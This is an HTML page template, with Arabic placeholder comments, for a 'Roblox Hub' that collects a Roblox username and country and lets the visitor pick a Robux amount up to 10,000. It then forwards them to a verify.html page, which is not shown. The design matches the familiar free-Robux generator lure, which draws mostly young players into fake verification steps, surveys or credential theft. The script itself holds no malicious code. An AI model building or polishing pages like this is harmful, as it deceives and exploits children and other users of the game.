<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Roblosxrs Hub</title>

  <!-- TODO: يمكنك تغيير الخط إن رغبت -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg1:#0f1226;
      --bg2:#1b1445;
      --card:#101426a6;
      --glass:#ffffff1a;
      --accent:#21d07a;
      --accent-2:#7cf5ff;
      --text:#f5f7ff;
      --muted:#b9c0d9;
      --warning:#ffd45e;
      --shadow:0 20px 60px #00000066;
      --radius:20px;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family:Inter,system-ui,Segoe UI,Roboto,Arial,Helvetica,sans-serif;
      color:var(--text);
      background:
        radial-gradient(1200px 800px at 80% -10%, #4b2cff33, transparent 60%),
        radial-gradient(1000px 900px at -10% 110%, #00e5ff22, transparent 60%),
        linear-gradient(160deg, var(--bg1), var(--bg2));
      overflow-x:hidden;
    }

    /* === Background Image Layer (replaceable) === */
    .bg-image{
      position:fixed; inset:0;
      background-image:url('assets/roblox-hero.jpg'); /* TODO: ضع مسارك للصورة */
      background-size:cover; background-position:center;
      opacity:.18; filter:contrast(1.1) saturate(1.1);
      pointer-events:none;
    }

    /* Floating coins animation */
    .float-coin{
      position:fixed;
      width:48px; height:48px;
      background: radial-gradient(#ffe082, #ffc107);
      border-radius:50%;
      box-shadow:0 6px 20px #00000066 inset, 0 0 0 3px #5a3f00aa inset;
      animation: drift 14s linear infinite;
      opacity:.75;
      pointer-events:none;
    }
    .float-coin:before{
      content:'R$';
      position:absolute; inset:0;
      display:grid; place-items:center;
      font-weight:800; color:#2b1a00; filter:drop-shadow(0 1px 0 #fff3);
    }
    @keyframes drift{
      from{ transform: translateY(110vh) translateX(0) rotate(0deg) }
      to{ transform: translateY(-10vh) translateX(20px) rotate(360deg) }
    }

    .container{
      min-height:100dvh;
      display:grid;
      place-items:center;
      padding:28px 18px 60px;
    }

    .card{
      position:relative;
      width:min(920px, 92vw);
      background:linear-gradient(180deg, #0c1022cc, #0c0f1ecc);
      border:1px solid var(--glass);
      box-shadow:var(--shadow);
      border-radius:var(--radius);
      overflow:hidden;
      backdrop-filter: blur(8px);
    }
    .hero{
      position:relative;
      padding:34px 30px 20px 30px;
      display:flex; gap:22px; align-items:center; flex-wrap:wrap;
      border-bottom:1px solid #ffffff14;
    }
    .hero-art{
      flex:0 0 120px; height:120px; border-radius:18px;
      background-image:url('assets/roblox-tile.jpg'); /* TODO: غيّر الصورة */
      background-size:cover; background-position:center;
      box-shadow:0 10px 30px #00000055;
      outline:2px solid #ffffff22;
      animation:pulse 2.2s ease-in-out infinite;
    }
    @keyframes pulse{
      0%,100%{ transform: translateY(0)}
      50%{ transform: translateY(-4px)}
    }
    .hero-copy{
      min-width:260px; flex:1 1 auto;
    }
    .eyebrow{
      color:var(--warning); font-weight:700; letter-spacing:.12em;
      text-transform:uppercase; font-size:.78rem; opacity:.9;
    }
    h1{
      margin:6px 0 6px; line-height:1.1;
      font-size: clamp(1.6rem, 1.2rem + 2vw, 2.4rem);
    }
    .sub{
      color:var(--muted);
      font-size:clamp(.95rem, .85rem + .2vw, 1.05rem);
    }

    .form{
      padding:24px 26px 30px;
      display:grid; gap:18px;
      grid-template-columns: 1fr;
    }
    .field{
      display:grid; gap:10px;
    }
    label{
      font-weight:700; letter-spacing:.02em;
    }
    .input, select, .range-wrap{
      background:#0b0f1f; color:var(--text);
      border:1px solid #ffffff26; border-radius:14px;
      padding:14px 16px; font-size:16px;
      outline:none; transition:.25s border, .25s box-shadow, .25s transform;
      box-shadow:0 0 0 0 #21d07a00;
    }
    .input:focus, select:focus, .range-wrap:focus-within{
      border-color:#7cf5ffaa; box-shadow:0 0 0 6px #7cf5ff14;
      transform: translateY(-1px);
    }
    .row{
      display:grid; gap:16px;
      grid-template-columns: 1fr;
    }
    @media (min-width:720px){
      .row{ grid-template-columns: 1fr 1fr }
    }

    .range-wrap{ padding:16px }
    .range-top{
      display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;
    }
    .badge{
      font-weight:800; font-size:14px; color:#0b1222;
      background:linear-gradient(180deg,#21d07a,#18b565);
      padding:6px 10px; border-radius:999px;
      box-shadow: inset 0 -2px 0 #00000022;
    }
    input[type="range"]{
      width:100%; appearance:none; height:10px; border-radius:999px;
      background:linear-gradient(90deg, #21d07a, #7cf5ff);
      outline:none;
    }
    input[type="range"]::-webkit-slider-thumb{
      appearance:none; width:26px; height:26px; border-radius:50%;
      background:#fff; border:3px solid #21d07a; box-shadow:0 6px 16px #0007;
      cursor:pointer;
    }

    .actions{
      display:flex; gap:14px; align-items:center; justify-content:center; margin-top:6px;
      flex-wrap:wrap;
    }
    .btn{
      --g1:#38f5b9; --g2:#18a8ff;
      position:relative;
      border:none; color:#061018; font-weight:900; letter-spacing:.02em;
      background:linear-gradient(90deg, var(--g1), var(--g2));
      padding:15px 22px; border-radius:14px; cursor:pointer; font-size:17px;
      box-shadow:0 14px 34px #0cd3ff33, inset 0 -2px 0 #00000029;
      transition: transform .15s ease, filter .2s ease, opacity .2s ease;
    }
    .btn[disabled]{ opacity:.4; cursor:not-allowed; filter:grayscale(.4) }
    .btn:not([disabled]):hover{ transform: translateY(-2px) }
    .btn:not([disabled]):active{ transform: translateY(0) scale(.98) }

    .note{
      text-align:center; color:#9fb2d9; font-size:.92rem;
    }
    .footer{
      padding:18px; text-align:center; color:#8490b2; font-size:.86rem;
      border-top:1px solid #ffffff14;
    }

    /* Accessibility helpers */
    .sr{ position:absolute !important; height:1px; width:1px; overflow:hidden; clip: rect(1px,1px,1px,1px); white-space:nowrap; }

  </style>
</head>
<body>
  <div class="bg-image" aria-hidden="true"></div>

  <!-- Floating coins (decor) -->
  <div class="float-coin" style="left:6%; animation-delay:0s;"></div>
  <div class="float-coin" style="left:82%; animation-delay:3s;"></div>
  <div class="float-coin" style="left:54%; animation-delay:6s;"></div>

  <main class="container">
    <section class="card" role="region" aria-label="Roblox Entry">
      <div class="hero">
        <div class="hero-art" aria-hidden="true"></div>
        <div class="hero-copy">
          <div class="eyebrow">Welcome</div>
          <h1>Set up your Roblox entry</h1>
          <p class="sub">Add your Roblox username, tell us your country, and choose your target Robux amount. Let’s keep it clean and simple.</p>
        </div>
      </div>

      <form class="form" id="form">
        <div class="field">
          <label for="username">Roblox username</label>
          <input class="input" id="username" name="username" type="text" placeholder="e.g., NightBuilder_07" autocomplete="nickname" required />
        </div>

        <div class="row">
          <div class="field">
            <label for="country">Your country</label>
            <!-- يمكنك تغييره إلى <select> بقائمة دول إن رغبت -->
            <input class="input" id="country" name="country" type="text" placeholder="Enter your country" />
            
          </div>

          <div class="field">
            <label for="robux">Robux goal</label>
            <div class="range-wrap" id="rangeWrap" tabindex="0" aria-label="Robux slider">
              <div class="range-top">
                <span class="muted">Choose how much Robux you want</span>
                <span class="badge"><span id="robuxOut">800</span> R$</span>
              </div>
              <input type="range" id="robux" min="400" max="10000" step="100" value="800" />
            </div>
          </div>
        </div>

        <div class="actions">
          <button type="submit" class="btn" id="goBtn" disabled>Continue</button>
          <div class="note">You’ll review the info on the next screen.</div>
        </div>
      </form>

      <div class="footer">
        <!-- TODO: يمكنك وضع شعارك أو حقوقك هنا -->
        © <span id="year"></span> Roblox Hub. All rights reserved.
      </div>
    </section>
  </main>

  <script>
    const form = document.getElementById('form');
    const username = document.getElementById('username');
    const country  = document.getElementById('country');
    const robux = document.getElementById('robux');
    const robuxOut = document.getElementById('robuxOut');
    const goBtn = document.getElementById('goBtn');
    const yearEl = document.getElementById('year');
    yearEl.textContent = new Date().getFullYear();

    function validate(){
      const ok = username.value.trim().length >= 3 && Number(robux.value) >= 400;
      goBtn.disabled = !ok;
    }
    username.addEventListener('input', validate);
    robux.addEventListener('input', e=>{
      robuxOut.textContent = e.target.value;
      validate();
    });

    form.addEventListener('submit', e=>{
      e.preventDefault();
      const data = {
        u: username.value.trim(),
        c: country.value.trim(),
        r: Number(robux.value),
        t: Date.now()
      };
      // Store locally + fallback via query
      localStorage.setItem('rbx_entry', JSON.stringify(data));
      const qs = new URLSearchParams({u:data.u, r:String(data.r)});
      window.location.href = 'verify.html?' + qs.toString();
    });

    // small UX: if user pastes username, update quickly
    username.addEventListener('paste', ()=> setTimeout(validate, 0));
  </script>
</body>
</html>
